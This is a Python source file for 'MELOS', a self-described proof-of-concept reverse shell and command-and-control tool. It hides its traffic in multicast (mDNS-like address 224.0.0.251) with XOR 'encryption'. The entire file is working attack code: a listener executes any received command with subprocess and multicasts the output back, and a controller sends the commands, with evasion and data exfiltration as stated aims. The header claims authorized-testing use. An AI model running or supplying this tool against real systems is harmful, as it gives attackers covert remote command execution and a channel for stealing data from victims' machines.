"""\
     o       .                         o      .
                      .
   .        dBBBBBBb  dBBBP  dBP    dBBBBP dBBBBP 
           dB'   dB' dB     dBP    dB' BP BP'      .
          dB'dB'dB' dBBP   dBP    dB' BP  'BBBBb 
         dB'dB'dB' dBP    dBP    dB' BP      dBP      .
        dB'dB'dB' dBBBBP dBBBBP dBBBBP  dBBBBP'      .'.
       .      Configuration Vulnerability            |o|
                    .           o              .    .'o'.
  .      |                                          |._.|
       --o--        MELOS by 0xFNDH       .         '   '
         | Zero eXcuses For Non-Dreamers Here        ) (
      o               .                        .    (   )

Multicast Encrypted Light Operations Shell (MELOS) is a proof-of-concept reverse shell
tool based on the post-exploitation stage of the penetration testing process. It uses
multicast as an evasive method to establish command-and-control (C2) and conduct data exfiltration.

Please do not use in military or secret service organizations, or for illegal purposes.
These tools are meant for authorized parties with legal consent to conduct testing.\
"""

import subprocess
import socket
import struct
import time
import sys
import os

def encrypt(txt, key):
  reps = (len(txt)-1)//len(key) +1
  btxt = txt.encode()
  key = (key * reps)[:len(txt)].encode()
  enc = bytes([i1^i2 for (i1,i2) in zip(btxt,key)])
  return enc

def decrypt(enc, key):
  reps = (len(enc)-1)//len(key) +1
  key = (key * reps)[:len(enc)].encode()
  plain = bytes([i1^i2 for (i1,i2) in zip(enc,key)])
  return plain.decode()

def IPv4LAN():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(("255.255.255.255", 1))
    IP = s.getsockname()[0]
  except Exception:
    IP = "127.0.0.1"
  finally:
    s.close()
  return IP

def multicast_recv(port, address="224.0.0.251", ttl=5, hops=255):
  try:
    uname = list(os.uname())[0]
  except:
    uname = os.name
  if uname == "Linux":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", port))
    mreq = struct.pack("4sl", socket.inet_aton(address), socket.INADDR_ANY)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.settimeout(ttl)
    return sock
  
  elif uname == "Darwin":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    try:
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except AttributeError:
      pass
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops) 
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
    sock.bind((address, port))
    host = IPv4LAN()
    sock.setsockopt(socket.SOL_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
    sock.setsockopt(socket.SOL_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
    sock.settimeout(ttl)
    return sock

  elif uname == "nt":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    try:
      sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except AttributeError:
      pass
    host = IPv4LAN()
    sock.bind((host, port))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(host))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(address) + socket.inet_aton(host))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, hops)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
    sock.settimeout(ttl)
    return sock

def multicast_send(ttl=255):
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
  sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
  return sock

def melos_shell(password, multicast_group="224.0.0.251", commandport=10020, responseport=10050):
  print(f"    =[ Awaiting on {multicast_group}:{commandport}    ]\n")
  sock = multicast_recv(commandport, multicast_group, ttl=60)
  respond = multicast_send()
  while True:
    try:
      command, address = sock.recvfrom(4096)
      plain = decrypt(command, password)
      print(f"[{address[0]}:{address[1]}] {plain}")
      if plain == "exit":
        respond.sendto(encrypt("     =[ MELOS Shell Closed ]",password), (multicast_group,responseport))
        respond.close()
        sock.close()
        break
      info = subprocess.getoutput(plain)
      enc_info = encrypt(info, password)
      respond.sendto(enc_info, (multicast_group, responseport))
    except KeyboardInterrupt:
      respond.close()
      sock.close()
      break
    except:
      pass

def melos_cmd(password, multicast_group="224.0.0.251", commandport=10020, recvport=10050):
  print(f"    =[ MELOS C2 Sending to {multicast_group}:{commandport} ]\n")
  listen = multicast_recv(recvport, multicast_group, ttl=5)
  sock = multicast_send()
  while True:
    try:
      cmd = input(f"melos@{multicast_group}:{recvport} $ ")
      enc_cmd = encrypt(cmd, password)
      sock.sendto(enc_cmd, (multicast_group, commandport))
      stdout, address = listen.recvfrom(4096)
      plain = decrypt(stdout, password)
      print(f"     =[ Packet From {address[0]}:{address[1]} ]\n{plain}")
      if cmd == "exit":
        listen.close()
        sock.close()
        break
    except KeyboardInterrupt:
      listen.close()
      sock.close()
      break
    except:
      pass

if __name__ == "__main__":
  
  print(__doc__.split("\n\n")[0])
  
  if len(sys.argv) == 1 or "-h" in sys.argv:
    print("    =[ Use -l or --listen to start listener ]*")
    print("    =[ Use -c or --cmd to control listener  ]*")
    print("    =[ Use -p or --password to set password ]")
    print("    =[ Use -g or --group to set multi group ]\n")
    sys.exit()

  password = "default"
  if ("-p" not in sys.argv or "--password" not in sys.argv) and len(sys.argv) <= 3:
    print("    =[ Password is set to default!          ]")
    print("    =[ Use -p or --password to set password ]")
  else:
    if "-p" in sys.argv:
      password = sys.argv[sys.argv.index("-p")+1]
    elif "--password" in sys.argv:
      password = sys.argv[sys.argv.index("--password")+1]
  
  groupaddr = "224.0.0.251"
  if "-g" in sys.argv:
    groupaddr = sys.argv[sys.argv.index("-g")+1]
  elif "--group" in sys.argv:
    groupaddr = sys.argv[sys.argv.index("--group")+1]
  if groupaddr.startswith("224.") == False:
    print("    =[ Invalid multicast address provided   ]\n")
    sys.exit()
  
  for arg in ["-c", "--cmd"]:
    if arg in sys.argv:
      melos_cmd(password, groupaddr)
      sys.exit()
  for arg in ["-l", "--listen"]:
    if arg in sys.argv:
      melos_shell(password, groupaddr)
      sys.exit()
  
  print("    =[ Key arguments not set, use -h for help ]\n")
